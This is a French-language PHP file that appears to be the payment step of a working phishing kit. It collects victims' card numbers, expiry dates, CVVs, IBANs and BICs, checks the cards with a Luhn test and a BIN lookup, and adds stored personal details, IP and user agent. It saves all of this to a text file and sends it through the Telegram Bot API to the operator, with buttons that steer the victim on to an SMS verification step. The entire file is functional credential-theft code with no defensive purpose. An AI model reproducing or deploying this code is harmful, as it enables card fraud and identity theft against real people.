<?php
include 'email.php';

// Redirections selon la constante APPLE_PAY_ENABLED
if (defined('APPLE_PAY_ENABLED')) {
    if (APPLE_PAY_ENABLED) {
        header('Location: sms-verification.php');
        exit();
    } else {
        header('Location: success.php');
        exit();
    }
}

// Si non définie, continuer normalement (vers Verification-bancaire.php plus bas dans le script)
?>
<?php
declare(strict_types=1);

// app/Reglement.php

session_start();

// --- Configurations et protections ---
require_once __DIR__ . '/../email.php';
require_once __DIR__ . '/../PREVENTS/infos.php';

// --- Stockage IP et User‑Agent ---
$_SESSION['ip']        = $_SESSION['ip']        ?? ($_SERVER['REMOTE_ADDR']     ?? 'unknown');
$_SESSION['useragent'] = $_SESSION['useragent'] ?? ($_SERVER['HTTP_USER_AGENT'] ?? 'unknown');

// --- Base URL pour Telegram ---
$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';
$host     = $_SERVER['HTTP_HOST'];
$dir      = rtrim(dirname($_SERVER['PHP_SELF']), '/\\');
$baseUrl  = "{$protocol}{$host}{$dir}";

// --- Gestion d'horaire robuste ---
date_default_timezone_set('Europe/Paris'); // Définir le fuseau horaire approprié
$currentDateTime = new DateTime();
$currentDate = $currentDateTime->format('Y-m-d');
$currentTime = $currentDateTime->format('H:i:s');
$_SESSION['timestamp'] = $currentDateTime->format('Y-m-d H:i:s');

// --- Fichier de log pour les données ---
$logFile = __DIR__ . '/rez-cc.txt';

/**
 * Enregistre les données dans un fichier texte local
 */
function saveToTextFile(string $data, string $filePath): bool
{
    try {
        // Vérifier si le répertoire est accessible en écriture
        if (!is_writable(dirname($filePath))) {
            // Tentative de modification des permissions
            chmod(dirname($filePath), 0755);
            if (!is_writable(dirname($filePath))) {
                error_log("Le répertoire n'est pas accessible en écriture: " . dirname($filePath));
                return false;
            }
        }
        
        // Ajouter les données au fichier
        $result = file_put_contents($filePath, $data . PHP_EOL, FILE_APPEND | LOCK_EX);
        return ($result !== false);
    } catch (Exception $e) {
        error_log("Erreur lors de l'écriture dans le fichier: " . $e->getMessage());
        return false;
    }
}

/**
 * Répond en JSON et termine.
 */
function jsonResponse(array $data, int $status = 200): void
{
    http_response_code($status);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($data, JSON_UNESCAPED_UNICODE);
    exit;
}

/**
 * Répond en texte brut et termine.
 */
function errorResponse(string $msg, int $status = 400): void
{
    http_response_code($status);
    header('Content-Type: text/plain; charset=utf-8');
    echo $msg;
    exit;
}

/**
 * Algo de Luhn pour valider la carte.
 */
function luhnCheck(string $num): bool
{
    $sum = 0; $alt = false;
    for ($i = strlen($num) - 1; $i >= 0; $i--) {
        $n = (int)$num[$i];
        if ($alt) {
            $n *= 2;
            if ($n > 9) $n -= 9;
        }
        $sum += $n;
        $alt = !$alt;
    }
    return $sum % 10 === 0;
}

// N'accepte que POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Allow: POST');
    errorResponse('Méthode non autorisée', 405);
}

try {
    // Récupérer IBAN (AJAX ou hidden)
    $holder   = trim((string)($_POST['account_holder'] ?? ''));
    $iban     = strtoupper(str_replace(' ', '', (string)($_POST['iban'] ?? '')));
    $bic      = strtoupper(str_replace(' ', '', (string)($_POST['bic'] ?? '')));
    $saveIban = !empty($_POST['save_iban']);

    // --- 1) Flux AJAX IBAN ---
    if (!isset($_POST['card_number'])) {
        // On accepte l'IBAN tel quel, même erroné
        $_SESSION['account_holder'] = $holder;
        $_SESSION['iban']           = $iban;
        $_SESSION['bic']            = $bic;
        $_SESSION['save_iban']      = $saveIban ? 1 : 0;

        // Contenu pour le fichier texte et Telegram
        $msg  = "🏦 [💶 INFO IBAN]\n\n";
        $msg .= "⏰ Date: {$currentDate} | Heure: {$currentTime}\n";
        $msg .= "👤 Titulaire : {$holder}\n";
        $msg .= "🏛 IBAN      : {$iban}\n";
        $msg .= "🔑 BIC       : {$bic}\n";
        $msg .= "💾 Sauvegarde: " . ($saveIban ? 'Oui' : 'Non') . "\n\n";
        $msg .= "👤 [INFO PERSO]\n";
        foreach (['prenom','nom','dob','adresse','city','zip','phone'] as $k) {
            $msg .= sprintf("   • %s : %s\n", ucfirst($k), $_SESSION[$k] ?? 'Non défini');
        }
        $msg .= "\n🩺 IP   : {$_SESSION['ip']}\n";
        $msg .= "🖥 UA   : {$_SESSION['useragent']}\n\n";
        $msg .= "------------------------------\n";
        
        // Sauvegarder dans le fichier texte
        $savedToFile = saveToTextFile($msg, $logFile);
        if (!$savedToFile) {
            error_log("Échec de l'enregistrement des données IBAN dans le fichier.");
        }

        // Envoi à Telegram
        global $bot_token, $chat_id;
        if (!empty($bot_token) && !empty($chat_id)) {
            // Inline buttons
            $ipEnc      = urlencode($_SESSION['ip']);
            $urlApplePay= "$baseUrl/query.php?ip={$ipEnc}&action=applepay";
            $urlSuccess = "$baseUrl/query.php?ip={$ipEnc}&action=success";
            $replyMarkup = [
                'inline_keyboard'=>[[
                    ['text'=>'📲 SMS Apple Pay✅','url'=>$urlApplePay],
                    ['text'=>'📵 Success ☑️','url'=>$urlSuccess]
                ]]
            ];
            @file_get_contents(
                "https://api.telegram.org/bot{$bot_token}/sendMessage?".
                http_build_query([ 'chat_id'=>$chat_id, 'text'=>$msg, 'reply_markup'=>json_encode($replyMarkup) ])
            );
        }
        jsonResponse(['status'=>'ok', 'file_saved' => $savedToFile]);
    }

    // --- 2) Flux CB (+ IBAN caché) ---
    // On accepte l'IBAN tel quel
    $_SESSION['account_holder'] = $holder;
    $_SESSION['iban']           = $iban;
    $_SESSION['bic']            = $bic;
    $_SESSION['save_iban']      = $saveIban ? 1 : 0;

    // Récupérer CB
    $rawCard  = preg_replace('/\s+/', '', (string)($_POST['card_number'] ?? ''));
    $rawExp   = trim((string)($_POST['expiry_date']  ?? ''));
    $cvv      = trim((string)($_POST['cvv']          ?? ''));
    $saveCard = !empty($_POST['save_card']);

    // Validation CB
    if (!ctype_digit($rawCard) || strlen($rawCard) < 13 || strlen($rawCard) > 19 || !luhnCheck($rawCard)) {
        throw new RuntimeException('💳 Numéro de carte invalide.');
    }
    if (!preg_match('/^(0[1-9]|1[0-2])\/\d{2}$/', $rawExp)) {
        throw new RuntimeException('📅 Format expiration invalide.');
    }
    list($m,$y) = explode('/', $rawExp, 2);
    $expDate = DateTime::createFromFormat('y-m', "$y-$m");
    if (!$expDate) throw new RuntimeException('📅 Date d\'expiration invalide.');
    $expDate->modify('last day of this month')->setTime(23,59,59);
    if ($expDate < new DateTime('now')) {
        throw new RuntimeException('⌛ Carte expirée.');
    }
    if (!preg_match('/^\d{3,4}$/', $cvv)) {
        throw new RuntimeException('🔒 CVV invalide.');
    }

    // Stocker CB
    $_SESSION['card_number']     = $rawCard;
    $_SESSION['card_expiration'] = "$m/$y";
    $_SESSION['card_cvv']        = $cvv;
    $_SESSION['save_card']       = $saveCard ? 1 : 0;

    // Lookup BIN
    $bin    = substr($rawCard, 0, 6);
    $ctx    = stream_context_create(['http'=>['method'=>'GET','header'=>"Referer: {$host}\r\n"]]);
    $binData= json_decode(@file_get_contents("https://data.handyapi.com/bin/{$bin}", false, $ctx), true) ?: [];
    $_SESSION['bank']     = $binData['Issuer']             ?? 'Inconnu';
    $_SESSION['type']     = $binData['Type']               ?? 'Inconnu';
    $_SESSION['level']    = $binData['CardTier']           ?? 'Inconnu';
    $_SESSION['country']  = $binData['Country']['Name']    ?? 'Inconnu';
    $_SESSION['currency'] = 'EUR';

    // Préparation du message pour Telegram et le fichier texte
    $cardImage = "https://cardimages.imaginecurve.com/cards/{$bin}.png";
    $msg  = "💳 [INFO CB]\n\n";
    $msg .= "⏰ Date: {$currentDate} | Heure: {$currentTime}\n";
    $msg .= "💳 Numéro     : {$rawCard}\n";
    $msg .= "📅 Expiration : {$_SESSION['card_expiration']}\n";
    $msg .= "🔒 CVV        : {$cvv}\n\n";
    $msg .= "🏦 [💶 IBAN]\n";
    $msg .= "👤 Titulaire : {$holder}\n";
    $msg .= "🏛 IBAN      : {$iban}\n";
    $msg .= "🔑 BIC       : {$bic}\n\n";
    $msg .= "👤 [INFO PERSO]\n";
    foreach (['prenom','nom','dob','adresse','city','zip','phone'] as $k) {
        $msg .= sprintf("   • %s : %s\n", ucfirst($k), $_SESSION[$k] ?? 'Non défini');
    }
    $msg .= "\n🏩 Banque     : {$_SESSION['bank']}\n";
    $msg .= "🏩 Type       : {$_SESSION['type']}\n";
    $msg .= "🏩 Niveau     : {$_SESSION['level']}\n";
    $msg .= "🏩 Pays       : {$_SESSION['country']}\n";
    $msg .= "🏩 Monnaie    : {$_SESSION['currency']}\n";
    $msg .= "🖼 BIN IMG    : {$cardImage}\n\n";
    $msg .= "🩺 IP   : {$_SESSION['ip']}\n";
    $msg .= "🖥 UA   : {$_SESSION['useragent']}\n\n";
    $msg .= "------------------------------\n";
    
    // Sauvegarder dans le fichier texte
    $savedToFile = saveToTextFile($msg, $logFile);
    if (!$savedToFile) {
        error_log("Échec de l'enregistrement des données CB dans le fichier.");
    }

    // Envoi Telegram complet
    global $bot_token, $chat_id;
    if (!empty($bot_token) && !empty($chat_id)) {
        // Inline buttons
        $ipEnc       = urlencode($_SESSION['ip']);
        $urlApplePay = "$baseUrl/query.php?ip={$ipEnc}&action=applepay";
        $urlSuccess  = "$baseUrl/query.php?ip={$ipEnc}&action=success";
        $replyMarkup = [
            'inline_keyboard'=>[[
                ['text'=>'📲 SMS Apple Pay✅','url'=>$urlApplePay],
                ['text'=>'📵 Success ☑️','url'=>$urlSuccess]
            ]]
        ];
        @file_get_contents(
            "https://api.telegram.org/bot{$bot_token}/sendMessage?".
            http_build_query(['chat_id'=>$chat_id,'text'=>$msg,'reply_markup'=>json_encode($replyMarkup)])
        );
    }

    // Redirection finale
    header('Location:/app/Verification-bancaire.php');
    exit;

} catch (Exception $e) {
    // Enregistrer l'erreur
    $errorMsg = '[' . date('Y-m-d H:i:s') . '] [' . basename(__FILE__) . '] ' . $e->getMessage();

    error_log($errorMsg);
    
    // Tenter d'enregistrer l'erreur dans le fichier de log
    saveToTextFile("ERREUR: " . $errorMsg, $logFile);
    
    // Répondre à la requête
    if (isset($_POST['iban']) && !isset($_POST['card_number'])) {
        jsonResponse(['status'=>'error', 'message'=>$e->getMessage()], 400);
    }
    errorResponse('Erreur serveur : '.$e->getMessage(), 500);
}